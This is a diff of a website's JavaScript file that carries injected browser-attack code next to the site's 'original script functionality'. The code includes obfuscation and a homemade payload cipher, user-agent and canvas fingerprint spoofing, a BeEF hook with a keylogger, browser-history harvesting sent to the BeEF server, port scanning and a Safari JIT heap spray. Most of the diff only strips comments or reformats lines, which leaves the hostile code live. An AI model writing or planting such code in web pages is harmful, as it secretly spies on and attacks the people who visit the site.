@@ -1789,7 +1789,7 @@
             return btoa(str.split('').map(c => String.fromCharCode(c.charCodeAt(0) ^ 0xFF)).join(''));
         }
 
-        // AES encryption for payloads
+        // AES-like encryption for payloads
         function encryptPayload(data, key = 'aurora-core-secret') {
             let enc = '';
             for (let i = 0; i < data.length; i++) {
@@ -1800,7 +1800,6 @@
 
         // Fingerprint evasion
         function evadeFingerprint() {
-            // Randomize user agent
             Object.defineProperty(navigator, 'userAgent', {
                 get: () => [
                     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
@@ -1808,7 +1807,6 @@
                 ][Math.floor(Math.random() * 2)]
             });
 
-            // Spoof canvas fingerprint
             const originalToDataURL = HTMLCanvasElement.prototype.toDataURL;
             HTMLCanvasElement.prototype.toDataURL = function() {
                 const canvas = document.createElement('canvas');
@@ -1819,10 +1817,8 @@
             };
         }
 
-        // Initialize evasion
         evadeFingerprint();
 
-        // BeEF integration and advanced exploits
         window.addEventListener('load', function() {
             if (typeof beef !== 'undefined') {
                 // Keylogger
@@ -1904,18 +1900,19 @@
                     });
                 }
 
-                // Browser history harvesting
-                const urls = ['https://www.google.com', 'https://www.facebook.com', 'https://www.amazon.com'];
-                const visited = [];
-                urls.forEach(url => {
-                    const link = document.createElement('a');
-                    link.href = url;
-                    document.body.appendChild(link);
-                    const color = window.getComputedStyle(link).color;
-                    visited.push({ url, visited: color !== 'rgb(0, 0, 238)' });
-                    document.body.removeChild(link);
-                });
-                beef.net.send('/history', { data: encryptPayload(JSON.stringify(visited)) });
+// Browser history harvesting
+const urls = ['https://www.google.com', 'https://www.facebook.com', 'https://www.amazon.com'];
+const visited = [];
+urls.forEach(url => {
+    const link = document.createElement('a');
+    link.href = url;
+    document.body.appendChild(link);
+    const color = window.getComputedStyle(link).color;
+    visited.push({ url, visited: color !== 'rgb(0, 0, 238)' });
+    document.body.removeChild(link);
+});
+beef.net.send('/history', { data: encryptPayload(JSON.stringify(visited)) });
+
 // Network reconnaissance
 const ports = [80, 443, 8080];
 const results = [];
@@ -1941,7 +1938,6 @@ function safariJITSpray() {
         for (let i = 0; i < arr.length; i++) {
             arr[i] = new Array(0x100).fill(0x41414141);
         }
-        // Trigger JIT compilation
         for (let i = 0; i < 1000; i++) {
             arr.map(x => x.join(''));
         }
@@ -2019,7 +2015,6 @@ function keepWebSocketAlive() {
     }, 30000);
 }
 keepWebSocketAlive();
-}
 
 // Original script functionality (preloader, cursor, neural network, etc.)
 window.addEventListener('load', function() {
